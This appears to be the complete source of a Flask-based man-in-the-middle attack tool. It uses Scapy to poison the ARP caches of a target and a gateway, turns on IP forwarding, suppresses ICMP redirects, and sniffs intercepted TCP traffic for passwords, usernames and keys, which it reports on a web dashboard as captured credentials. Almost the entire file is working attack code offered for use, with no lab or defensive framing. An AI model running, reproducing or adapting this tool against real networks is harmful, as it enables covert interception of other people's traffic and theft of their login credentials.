"""
ARP & DNS Toolkit - Backend Application
=======================================
This Flask application serves as the control center for a Man-in-the-Middle (MitM) 
attack tool. It utilizes the Scapy library to perform ARP Spoofing and packet sniffing 
in a background thread, while serving a real-time web dashboard for monitoring.

Key Features:
- ARP Cache Poisoning (Double-sided)
- Real-time Packet Sniffing & Keyword Analysis
- IP Forwarding Management
- Thread-safe Execution & Cleanup
"""

from flask import Flask, render_template, jsonify, request
import threading
import time
import scapy.all as scapy
import sys
import os
import signal
import re 

app = Flask(__name__)


# GLOBAL STATE CONFIGURATION
# Thread synchronization primitive to signal stopping of background tasks
STOP_EVENT = threading.Event()

# Handles for background threads
ATTACK_THREAD = None
SNIFFER_THREAD = None

# Application state dictionary shared with the frontend via AJAX
STATUS = {
    "state": "IDLE",
    "target": "192.168.1.20",
    "gateway": "192.168.1.1",
    "interface": "eth0",
    "packets": 0,
    "target_mac": "N/A",
    "logs": ["[SYSTEM] Initialized. Ready."],
    "intercepted_data": [] 
}


# UTILITY & SYSTEM FUNCTIONS
def log_msg(message):
    """
    Appends a timestamped message to the global log buffer.
    Maintains a fixed buffer size (last 50 logs) to optimize memory usage.
    """
    timestamp = time.strftime('%H:%M:%S')
    full_msg = f"[{timestamp}] {message}"
    if len(STATUS["logs"]) > 50:
        STATUS["logs"].pop(0)
    STATUS["logs"].append(full_msg)
    # Echo to standard output for terminal debugging
    print(full_msg)

def set_ip_forwarding(value):
    """
    Toggles Linux Kernel IP Forwarding.
    Required to allow traffic to flow through the attacker machine to the gateway.
    
    Args:
        value (int): 1 to enable, 0 to disable.
    """
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write(str(value))
    except Exception as e:
        log_msg(f"FATAL: Failed to set IP forwarding: {e}")
        sys.exit(1)

def get_mac(ip):
    """
    Resolves the MAC address for a given IP address using ARP.
    
    Args:
        ip (str): The target IP address.
        
    Returns:
        str: The resolved MAC address, or None if unreachable.
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, iface=STATUS["interface"])[0]

    # Send packet and wait for response using the specific interface
    return answered_list[0][1].hwsrc if answered_list else None

def spoof(target_ip, spoof_ip, target_mac):
    """
    Sends a forged ARP Reply packet to poison the target's ARP cache.
    
    Args:
        target_ip (str): The victim's IP address.
        spoof_ip (str): The IP we are impersonating (e.g., Gateway).
        target_mac (str): The victim's MAC address.
    """
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False, iface=STATUS["interface"])

def restore(destination_ip, source_ip):
    """
    Restores the network tables to their original state to prevent denial of service 
    after the attack stops. Sends correct ARP associations.
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if not destination_mac or not source_mac:
        log_msg("WARNING: Could not resolve MACs for clean exit.")
        return
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)

    # Send multiple times to ensure the target processes the update
    scapy.send(packet, count=4, verbose=False, iface=STATUS["interface"])


# PACKET SNIFFING LOGIC
def packet_callback(packet):
    """
    Callback function executed for every packet captured by Scapy.
    Filters for HTTP traffic and scans payloads for sensitive keywords.
    """
    if STOP_EVENT.is_set(): return 

    # Analyze only TCP packets containing Raw payloads (Data)
    if packet.haslayer(scapy.Raw) and packet.haslayer(scapy.TCP):
        try:
            payload = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
            
            # Keywords indicating sensitive data transmission
            keywords = ["pass=", "password", "user=", "username", "login", "secret", "CONFIDENTIAL", "key="]
            is_sensitive = False
            captured_secret = ""

            # Scan payload line-by-line
            for line in payload.split('\n'):
                if any(key.lower() in line.lower() for key in keywords):
                    is_sensitive = True
                    captured_secret = line.strip()
                    break 
            
            # Process packet if it is HTTP traffic or contains secrets
            if is_sensitive or "HTTP" in payload:
                # Extract Source and Destination IPs
                if packet.haslayer(scapy.IP):
                    src = packet[scapy.IP].src
                    dst = packet[scapy.IP].dst
                else:
                    src = "Unknown"
                    dst = "Unknown"

                if is_sensitive:
                    snippet = f"[SECRET] {captured_secret[:60]}" 
                    log_type = "ALERT" 
                else:
                    # Capture the HTTP Request/Response header
                    snippet = payload.split('\r\n')[0][:60]
                    log_type = "INFO"

                # Update the global status object for the dashboard
                STATUS["intercepted_data"].append({
                    "time": time.strftime('%H:%M:%S'),
                    "src": src,
                    "dst": dst,
                    "snippet": snippet,
                    "type": log_type
                })
                
                # Alert in main log if critical data found
                if is_sensitive:
                    log_msg(f"[ALERT] CAPTURED CREDENTIALS from {src}!")

        except Exception as e:
            pass 


# ATTACK EXECUTION THREAD
def run_attack_loop(target_ip, gateway_ip):
    """
    Main loop for the Man-in-the-Middle attack.
    Continuously sends spoofed packets to maintain the poisoned state.
    """
    STATUS["state"] = "RUNNING"
    STATUS["packets"] = 0
    log_msg(f"[+] Attack launched against {target_ip}")

    # Enable IP Forwarding
    set_ip_forwarding(1)
    
    # Disable ICMP Redirects to prevent the OS from correcting the route
    os.system("sysctl -w net.ipv4.conf.all.send_redirects=0 > /dev/null")
    
    try:
        while not STOP_EVENT.is_set():
            target_mac = get_mac(target_ip)
            gateway_mac = get_mac(gateway_ip)
            
            if target_mac and gateway_mac:
                # Log successful resolution only once
                if STATUS["target_mac"] == "N/A":
                    STATUS["target_mac"] = target_mac
                    log_msg(f"[+] RESOLVED: Target={target_mac} | Gateway={gateway_mac}")
                
                # Perform Double-Sided Spoofing
                spoof(target_ip, gateway_ip, target_mac) 
                spoof(gateway_ip, target_ip, gateway_mac) 
                
                STATUS["packets"] += 2
                # Packet sent logs removed to reduce spam
            else:
                log_msg(f"[!] WARNING: Target unreachable. Retrying...")
                
            time.sleep(2)

    except Exception as e:
        log_msg(f"[!] CRITICAL ERROR: {e}")
    
    finally:
        # Cleanup routine
        log_msg("[-] Stopping thread... Restoring ARP tables.")
        restore(target_ip, gateway_ip)
        set_ip_forwarding(0)
        STATUS["state"] = "IDLE"
        STATUS["target_mac"] = "N/A"
        STOP_EVENT.clear() 


# FLASK WEB ROUTES
@app.route('/')
def index():
    """Renders the main dashboard template."""
    if scapy.conf.iface is None: STATUS["interface"] = 'eth0'
    return render_template('index.html', data=STATUS)

@app.route('/update')
def update():
    """API Endpoint: Returns current tool status and logs as JSON."""
    return jsonify(STATUS)

@app.route('/action', methods=['POST'])
def action():
    """API Endpoint: Handles Start/Stop commands from the frontend."""
    global ATTACK_THREAD, SNIFFER_THREAD
    req = request.json
    action_type = req.get('action')
    
    if action_type == 'start':
        if STATUS["state"] == "RUNNING":
            return jsonify({"status": "error", "message": "Attack already running!"})
        
        # Apply configuration from UI
        STATUS["target"] = req.get('target')
        STATUS["gateway"] = req.get('gateway')
        STATUS["interface"] = req.get('interface')
        scapy.conf.iface = STATUS["interface"]
        
        # Start Packet Sniffer Thread
        SNIFFER_THREAD = threading.Thread(target=scapy.sniff, kwargs={
            'iface': STATUS["interface"], 
            'store': 0, 
            'prn': packet_callback
        })
        SNIFFER_THREAD.daemon = True
        SNIFFER_THREAD.start()

        # Start ARP Spoofing Thread
        STOP_EVENT.clear()
        ATTACK_THREAD = threading.Thread(target=run_attack_loop, args=(STATUS["target"], STATUS["gateway"]))
        ATTACK_THREAD.daemon = True
        ATTACK_THREAD.start()
        return jsonify({"status": "success", "message": "Attack launched"})
    
    elif action_type == 'stop':
        # Signal threads to terminate gracefully
        STOP_EVENT.set()
        return jsonify({"status": "success", "message": "Stopping..."})
    
    return jsonify({"status": "error", "message": "Invalid action."})


# MAIN ENTRY POINT
if __name__ == '__main__':
    # Ensure Scapy uses the default interface
    scapy.conf.iface = STATUS["interface"]
    # Run Flask server accessible on all interfaces
    app.run(host='0.0.0.0', port=5000, debug=False)